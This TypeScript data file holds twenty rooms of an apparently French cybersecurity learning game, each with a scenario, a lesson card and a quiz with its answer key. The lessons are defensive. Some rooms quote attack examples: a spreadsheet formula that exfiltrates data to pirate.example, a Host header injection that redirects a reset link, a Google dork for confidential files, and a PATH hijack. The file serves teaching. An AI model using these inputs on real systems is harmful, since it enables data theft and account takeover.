import type { RoomContent } from "@/lib/types";
import { answer, card, choice, multi, order, room } from "./_build";

/** Salles 81 à 100 du niveau Difficile. */
export const DIFFICILE_6: RoomContent[] = [
  room(
    "difficile-81",
    "Le proxy d'interception",
    "Le testeur d'intrusion place un outil entre son navigateur et le site. Il voit, modifie et rejoue chaque requête avant qu'elle parte.",
    card("Le proxy d'interception", "Web", "🛠️", "Un outil comme Burp Suite ou OWASP ZAP permet de modifier les requêtes à la volée.", [
      "Il montre tout ce que le navigateur envoie réellement : en-têtes, cookies, paramètres cachés.",
      "On peut modifier un prix, un identifiant ou un rôle avant l'envoi.",
      "Leçon pour les développeurs : toute vérification doit être refaite côté serveur.",
    ], "Peut-on faire confiance à ce qu'envoie le navigateur ?"),
    choice("Que démontre cet outil aux développeurs ?", [
      ["Tout ce qui vient du navigateur peut être modifié", true, "Les contrôles côté client ne suffisent jamais."],
      ["Les requêtes HTTPS sont impossibles à lire", false, "Le testeur contrôle son propre navigateur, il voit tout."],
      ["Les formulaires valident toujours les données", false, "La validation JavaScript se contourne."],
    ]),
    "Contrôles refaits côté serveur. Modifier la requête ne sert plus à rien.",
  ),
  room(
    "difficile-82",
    "Le bombardement de données",
    "Un outil envoie des milliers de valeurs bizarres dans chaque champ : textes géants, caractères spéciaux, nombres négatifs. Le serveur finit par planter.",
    card("Le fuzzing", "Web", "🌪️", "Envoyer automatiquement des données inattendues pour trouver des bugs et des failles.", [
      "Un plantage ou une réponse étrange révèle une entrée mal gérée.",
      "Utilisé par les attaquants… et par les défenseurs pour corriger avant eux.",
      "Les grands logiciels sont fuzzés en continu (OSS-Fuzz, par exemple).",
    ], "Comment s'appelle cette technique de test ?"),
    answer("Comment s'appelle cette technique ?", ["fuzzing", "le fuzzing", "fuzz"], { placeholder: "Un mot anglais" }),
    "Le bug trouvé par fuzzing est corrigé avant qu'un pirate ne l'exploite.",
  ),
  room(
    "difficile-83",
    "La bannière trop honnête",
    "En se connectant au port 21, le pirate reçoit : « 220 ProFTPD 1.3.3c Server ready ». Il ouvre aussitôt une base de failles.",
    card("La récupération de bannières", "Réseau", "🏳️", "Les services annoncent souvent leur nom et leur version dès la connexion.", [
      "Connaître la version exacte permet de chercher les failles connues (CVE).",
      "nmap -sV automatise cette détection de versions.",
      "Masquer la version aide un peu, mais mettre à jour aide beaucoup plus.",
    ], "Qu'apprend-on en lisant cette bannière ?"),
    choice("Quelle est la vraie solution ?", [
      ["Mettre à jour le service (et masquer la version)", true, "Masquer seul ne suffit pas ; la mise à jour corrige la faille."],
      ["Seulement changer le message d'accueil", false, "La faille reste exploitable."],
      ["Changer de port", false, "Un scan le retrouvera."],
    ]),
    "Service mis à jour. La bannière ne mène plus à aucune faille connue.",
  ),
  room(
    "difficile-84",
    "Le moteur de recherche des objets",
    "Sans scanner lui-même, le pirate trouve en ligne la liste de toutes les caméras de l'entreprise exposées sur Internet, avec leur modèle.",
    card("Shodan", "Réseau", "🛰️", "Un moteur de recherche qui indexe les appareils et services exposés sur Internet.", [
      "Shodan scanne Internet en permanence et enregistre les bannières des services.",
      "On y cherche par organisation, port, produit ou pays.",
      "Les défenseurs l'utilisent aussi pour voir ce que leur entreprise expose.",
    ], "Un moteur de recherche pas comme les autres."),
    choice("Comment les défenseurs peuvent-ils utiliser cet outil ?", [
      ["Pour voir ce que leur propre entreprise expose sur Internet", true, "Mieux vaut le découvrir avant les pirates."],
      ["Pour pirater les concurrents", false, "Illégal et hors sujet."],
      ["Ils ne peuvent pas l'utiliser", false, "C'est un excellent outil de surveillance de sa surface d'attaque."],
    ]),
    "Caméras retirées d'Internet. Shodan ne trouve plus rien.",
  ),
  room(
    "difficile-85",
    "La recherche avancée",
    "Le pirate tape dans un moteur de recherche : site:serveur-corp.fr filetype:pdf \"confidentiel\". Trois documents internes apparaissent.",
    card("Les Google dorks", "Web", "🔍", "Des opérateurs de recherche avancés qui révèlent des fichiers indexés par erreur.", [
      "site: limite à un domaine, filetype: à un type de fichier, intitle: au titre.",
      "Ils retrouvent des documents, des pages d'admin ou des fichiers de configuration exposés.",
      "Vérifie régulièrement ce que les moteurs indexent sur ton domaine.",
    ], "Quel opérateur limite à un type de fichier ?"),
    multi("Que faire après cette découverte ?", [
      ["Retirer les documents du site public", true, "Ils n'ont rien à faire en ligne."],
      ["Demander leur suppression de l'index du moteur", true, "Ils disparaissent des résultats plus vite."],
      ["Vérifier comment ils ont été publiés", true, "Pour que ça ne se reproduise pas."],
      ["Ajouter le mot « secret » dans le titre", false, "Ça les rendrait encore plus visibles."],
    ]),
    "Documents retirés et désindexés. La recherche avancée ne trouve plus rien.",
  ),
  room(
    "difficile-86",
    "Le mail sur mesure",
    "Le mail reçu par la comptable cite son chef par son prénom, le nom du projet en cours et le séminaire de la semaine dernière.",
    card("Le spear phishing", "Social", "🎯", "Un phishing ciblé, préparé avec des informations sur la victime.", [
      "Le pirate collecte des informations publiques : LinkedIn, site de l'entreprise, réseaux sociaux.",
      "Le message est crédible car personnalisé, donc bien plus efficace.",
      "Les règles de vérification (rappel, double validation) restent la meilleure défense.",
    ], "Un phishing visant une personne précise."),
    choice("D'où viennent probablement ces informations ?", [
      ["Des réseaux sociaux et du site de l'entreprise", true, "LinkedIn et les publications publiques suffisent souvent."],
      ["D'un piratage de la NASA", false, "Pas besoin d'aller si loin."],
      ["Du hasard", false, "C'est un travail de préparation ciblé."],
    ]),
    "La comptable a vérifié par téléphone. Le spear phishing a échoué.",
  ),
  room(
    "difficile-87",
    "Le faux auditeur",
    "Un homme en costume se présente : « Je suis l'auditeur de la maison mère, j'ai besoin d'un accès au serveur aujourd'hui, c'est urgent. » Il a un badge imprimé.",
    card("Le prétexte", "Social", "🎭", "Une histoire crédible inventée pour obtenir un accès ou une information.", [
      "Le pirate joue un rôle : technicien, auditeur, livreur, nouveau collègue.",
      "Il mise sur l'autorité et l'urgence pour éviter les vérifications.",
      "Toute demande d'accès se vérifie auprès de la personne responsable, par un canal connu.",
    ], "Comment vérifier une identité professionnelle ?"),
    choice("Que faire ?", [
      ["Vérifier auprès de son responsable et de la maison mère par un numéro connu", true, "Un vrai auditeur comprendra la vérification."],
      ["Donner l'accès, il a un badge", false, "Un badge s'imprime facilement."],
      ["Lui demander sa carte de visite", false, "Elle s'imprime aussi facilement."],
    ]),
    "Personne à la maison mère ne connaît cet « auditeur ». Il disparaît.",
  ),
  room(
    "difficile-88",
    "Le cookie qui reste à la maison",
    "Le cookie de session porte maintenant l'attribut SameSite=Lax. Les requêtes piégées venues d'autres sites ne l'envoient plus.",
    card("L'attribut SameSite", "Web", "🏠", "Il empêche le navigateur d'envoyer le cookie lors de requêtes venant d'autres sites.", [
      "Strict : jamais envoyé depuis un autre site ; Lax : seulement lors d'une navigation simple (lien) ; None : toujours (avec Secure).",
      "Il réduit fortement le risque de CSRF.",
      "Il complète les jetons anti-CSRF sans les remplacer totalement.",
    ], "Quelle attaque cet attribut freine-t-il ?"),
    choice("Contre quelle attaque protège surtout SameSite ?", [
      ["CSRF", true, "Le cookie n'est plus envoyé avec les requêtes forgées par un autre site."],
      ["Injection SQL", false, "SameSite ne touche pas aux requêtes SQL."],
      ["Force brute", false, "Aucun rapport."],
    ]),
    "Cookies en SameSite=Lax, Secure et HttpOnly. Le trio gagnant.",
  ),
  room(
    "difficile-89",
    "Le lien de réinitialisation détourné",
    "Le pirate demande une réinitialisation pour la victime en modifiant l'en-tête Host: pirate.example. Le mail envoyé contient un lien vers… pirate.example.",
    card("L'injection d'en-tête Host", "Web", "🏷️", "Le site construit ses liens à partir de l'en-tête Host, contrôlé par le visiteur.", [
      "Le jeton de réinitialisation de la victime part alors vers le serveur du pirate quand elle clique.",
      "Le site doit utiliser une adresse configurée, pas celle de la requête.",
      "Le serveur web doit aussi refuser les en-têtes Host inconnus.",
    ], "D'où le site prend-il le nom de domaine du lien ?"),
    choice("Comment corriger ?", [
      ["Construire les liens à partir d'une adresse configurée côté serveur", true, "L'en-tête Host n'a plus d'influence."],
      ["Raccourcir le jeton", false, "Le jeton partirait quand même chez le pirate."],
      ["Envoyer le mail en texte brut", false, "Le lien resterait faux."],
    ]),
    "Liens construits depuis la configuration. L'en-tête Host est ignoré.",
  ),
  room(
    "difficile-90",
    "L'onglet qui change",
    "Tu cliques sur un lien d'un forum qui s'ouvre dans un nouvel onglet. Pendant ce temps, l'onglet du forum se transforme en fausse page de connexion.",
    card("Le tabnabbing", "Web", "🗂️", "Une page ouverte depuis un lien peut modifier l'onglet qui l'a ouverte.", [
      "Avec target=\"_blank\" sans protection, la nouvelle page accède à window.opener.",
      "Elle peut rediriger l'onglet d'origine vers un faux site.",
      "rel=\"noopener noreferrer\" coupe ce lien (les navigateurs récents le font par défaut).",
    ], "Quel attribut ajouter aux liens externes ?"),
    choice("Quelle protection ajouter aux liens externes ?", [
      ["rel=\"noopener noreferrer\"", true, "La nouvelle page ne peut plus toucher l'onglet d'origine."],
      ["target=\"_self\" partout", false, "Ça marche, mais change le comportement des liens."],
      ["Un lien en gras", false, "Aucun effet."],
    ]),
    "Liens externes protégés. L'onglet d'origine ne bouge plus.",
  ),
  room(
    "difficile-91",
    "Le panier négatif",
    "Le pirate ajoute -5 casques au panier. Le total devient négatif et le site lui propose… un remboursement.",
    card("Les failles de logique", "Web", "🧮", "Le code fonctionne, mais la logique métier n'a pas prévu un cas absurde.", [
      "Quantités négatives, codes promo cumulés, étapes de paiement sautées…",
      "Aucun scanner automatique ne trouve facilement ces failles.",
      "Valide chaque règle métier côté serveur : quantité ≥ 1, prix fixé par le serveur.",
    ], "Une quantité peut-elle être négative ?"),
    multi("Quelles règles le serveur doit-il vérifier ?", [
      ["La quantité est un entier positif", true, "Plus de quantités négatives."],
      ["Le prix vient de la base, pas du navigateur", true, "Le visiteur ne choisit pas son prix."],
      ["Le paiement est validé avant l'expédition", true, "On ne saute pas d'étape."],
      ["La couleur du bouton « Payer »", false, "Aucun rapport avec la sécurité."],
    ]),
    "Règles métier vérifiées côté serveur. Le panier négatif n'existe plus.",
  ),
  room(
    "difficile-92",
    "Le tampon qui déborde",
    "Le programme copie le nom saisi dans une zone de 16 octets sans vérifier la longueur. Le pirate envoie 200 caractères.",
    card("Le dépassement de tampon", "Système", "🌊", "Écrire au-delà d'une zone mémoire écrase les données voisines.", [
      "En C, des fonctions comme strcpy ou gets ne vérifient pas la taille.",
      "Le pirate peut écraser l'adresse de retour et faire exécuter son propre code.",
      "Les langages sûrs (Rust, Go, Java) et les fonctions bornées évitent ce problème.",
    ], "Que se passe-t-il quand on écrit 200 octets dans 16 ?"),
    choice("Quelle est la meilleure correction ?", [
      ["Vérifier la longueur et utiliser des fonctions bornées", true, "On n'écrit jamais au-delà de la zone prévue."],
      ["Agrandir la zone à 32 octets", false, "Le pirate enverra 300 caractères."],
      ["Ajouter un commentaire dans le code", false, "Ça ne corrige rien."],
    ]),
    "Fonctions bornées partout. Le tampon ne déborde plus.",
  ),
  room(
    "difficile-93",
    "Les adresses qui bougent",
    "L'exploit du pirate échoue : l'adresse mémoire qu'il visait change à chaque lancement du programme.",
    card("Les protections mémoire", "Système", "🧠", "ASLR, DEP et canaris rendent l'exploitation de la mémoire bien plus difficile.", [
      "ASLR place le programme à des adresses aléatoires à chaque lancement.",
      "DEP (NX) interdit d'exécuter du code dans les zones de données.",
      "Les canaris détectent l'écrasement de la pile avant le retour de fonction.",
    ], "Qu'est-ce qui rend les adresses aléatoires ?"),
    answer("Quel est le sigle de la protection qui rend les adresses aléatoires ?", ["aslr"], { placeholder: "4 lettres" }),
    "ASLR, DEP et canaris actifs. L'exploit vise dans le vide.",
  ),
  room(
    "difficile-94",
    "La commande imitée",
    "Un script lancé par root appelle « tar » sans chemin complet. Le pirate a placé un faux tar dans /tmp et ajouté /tmp en tête du PATH.",
    card("Le détournement du PATH", "Système", "🛤️", "Le système cherche les commandes dans l'ordre des dossiers du PATH.", [
      "Si un dossier modifiable par le pirate est en tête du PATH, son programme est trouvé en premier.",
      "Dans les scripts privilégiés, utilise des chemins complets (/usr/bin/tar).",
      "Ne mets jamais « . » ou /tmp dans le PATH de root.",
    ], "Dans quel ordre le système cherche-t-il les commandes ?"),
    choice("Comment protéger le script ?", [
      ["Utiliser le chemin complet /usr/bin/tar et fixer le PATH dans le script", true, "Le faux tar n'est plus jamais appelé."],
      ["Renommer le script", false, "Le problème reste."],
      ["Lancer le script plus souvent", false, "Pire encore."],
    ]),
    "Chemins complets dans tous les scripts root.",
  ),
  room(
    "difficile-95",
    "Le tableur piégé",
    "L'export CSV des inscriptions contient un nom bizarre : =HYPERLINK(\"http://pirate.example?d=\"&A2,\"Cliquez\"). Le comptable l'ouvre dans son tableur.",
    card("L'injection de formule", "Web", "📈", "Une valeur commençant par = est interprétée comme une formule par le tableur.", [
      "Le pirate saisit une formule dans un formulaire du site ; elle s'exécute à l'ouverture de l'export.",
      "Elle peut exfiltrer des données vers un serveur ou tromper l'utilisateur.",
      "À l'export, préfixe d'une apostrophe les valeurs commençant par =, +, - ou @.",
    ], "Par quel caractère commence une formule ?"),
    choice("Comment protéger les exports ?", [
      ["Neutraliser les valeurs qui commencent par =, +, - ou @", true, "Elles s'affichent comme du texte."],
      ["Exporter en majuscules", false, "La formule resterait active."],
      ["Ne jamais ouvrir les exports", false, "Peu pratique : il vaut mieux les nettoyer."],
    ]),
    "Exports nettoyés. Les formules s'affichent comme du simple texte.",
  ),
  room(
    "difficile-96",
    "Le miroir de l'alphabet",
    "Une inscription au mur : « Wlnrmzgrlm ». Dessous, en tout petit : « l'alphabet vu dans un miroir ».",
    card("Reconnaître un encodage", "Crypto", "🪞", "Quelques indices suffisent souvent à deviner quelle transformation a été utilisée.", [
      "Même longueur, majuscules au même endroit, lettres seulement : substitution de lettres (César, ROT13, Atbash).",
      "Lettres, chiffres, + / et des = à la fin : Base64. Paires 0-9 a-f : hexadécimal.",
      "Essaie les transformations sans clé en premier : elles sont rapides à tester.",
    ], "Le « miroir » de l'alphabet : A↔Z, B↔Y…"),
    answer("Quel mot est caché ?", ["domination"], {
      tools: ["atbash", "base64", "reverse", "rot13"],
      workshopInput: "Wlnrmzgrlm",
      placeholder: "Le mot",
    }),
    "« Domination » : c'est le plan du pirate. Raté pour lui.",
  ),
  room(
    "difficile-97",
    "L'audit de mots de passe",
    "Avec l'accord de la direction, l'équipe sécurité teste les hashs de l'annuaire contre une liste de mots de passe courants. 18 % tombent en une heure.",
    card("L'audit de mots de passe", "Mots de passe", "📋", "Tester ses propres mots de passe pour trouver les faibles avant les pirates.", [
      "Toujours avec une autorisation écrite et un périmètre défini.",
      "Les comptes trouvés doivent changer de mot de passe, sans que les mots de passe soient divulgués.",
      "Les résultats servent à améliorer la politique (longueur, liste noire, sensibilisation).",
    ], "Que faut-il obtenir avant un tel test ?"),
    order("Remets les étapes de l'audit dans l'ordre.", [
      "Obtenir une autorisation écrite de la direction",
      "Tester les hashs contre des listes de mots de passe courants",
      "Forcer le changement des mots de passe trouvés",
      "Renforcer la politique de mots de passe et sensibiliser",
    ]),
    "Audit terminé. Les 18 % de mots de passe faibles ont été remplacés.",
  ),
  room(
    "difficile-98",
    "Le rapport de test d'intrusion",
    "Le test d'intrusion est fini. Le rapport liste 12 failles. La direction demande par laquelle commencer.",
    card("Prioriser les failles", "Défense", "🚦", "On corrige d'abord ce qui est le plus grave et le plus facile à exploiter.", [
      "On croise la gravité (impact) et la facilité d'exploitation.",
      "Une faille critique exposée sur Internet passe avant une faille faible en interne.",
      "Chaque correction doit être revérifiée (contre-test).",
    ], "Gravité + exposition."),
    choice("Quelle faille corriger en premier ?", [
      ["Une injection SQL critique sur le site public", true, "Grave et accessible à n'importe qui sur Internet."],
      ["Une bannière de version sur un serveur interne", false, "Peu grave et difficile d'accès."],
      ["Une page « À propos » mal orthographiée", false, "Ce n'est pas une faille de sécurité."],
    ]),
    "Injection SQL corrigée en premier, contre-test validé.",
  ),
  room(
    "difficile-99",
    "Les règles du jeu",
    "Un stagiaire propose de « tester la sécurité » du site d'un concurrent, juste pour voir. Le RSSI l'arrête net.",
    card("Le cadre légal des tests", "Défense", "⚖️", "Tester un système sans autorisation est un délit, même sans intention de nuire.", [
      "En France, l'accès frauduleux à un système est puni par l'article 323-1 du Code pénal.",
      "Un test d'intrusion se fait avec un contrat, une autorisation écrite et un périmètre précis.",
      "Pour s'entraîner : plateformes légales (Root-Me, Hack The Box, TryHackMe) et programmes de bug bounty.",
    ], "Que faut-il avant de tester un système ?"),
    choice("Que répond le RSSI ?", [
      ["C'est illégal sans autorisation écrite du propriétaire", true, "Même « juste pour voir »."],
      ["C'est permis si on ne casse rien", false, "L'accès lui-même est puni."],
      ["C'est permis le week-end", false, "Non, évidemment."],
    ]),
    "Le stagiaire s'entraîne désormais sur des plateformes légales.",
  ),
  room(
    "difficile-100",
    "La sortie du niveau",
    "Dernière porte du niveau Difficile. Pour l'ouvrir, remets la démarche d'un test d'intrusion dans l'ordre.",
    card("Les étapes d'un test d'intrusion", "Défense", "🏁", "Un test d'intrusion suit une méthode, de la reconnaissance au rapport.", [
      "Reconnaissance : collecter des informations sur la cible.",
      "Recherche de failles, puis exploitation dans le périmètre autorisé.",
      "Rapport avec les failles, les preuves et les recommandations.",
    ], "On ne peut pas exploiter avant d'avoir trouvé la faille."),
    order("Remets les étapes dans l'ordre.", [
      "Signer l'autorisation et définir le périmètre",
      "Reconnaissance",
      "Recherche de vulnérabilités",
      "Exploitation",
      "Rédaction du rapport",
    ]),
    "Niveau Difficile terminé : tu penses comme un attaquant… pour mieux défendre !",
  ),
];
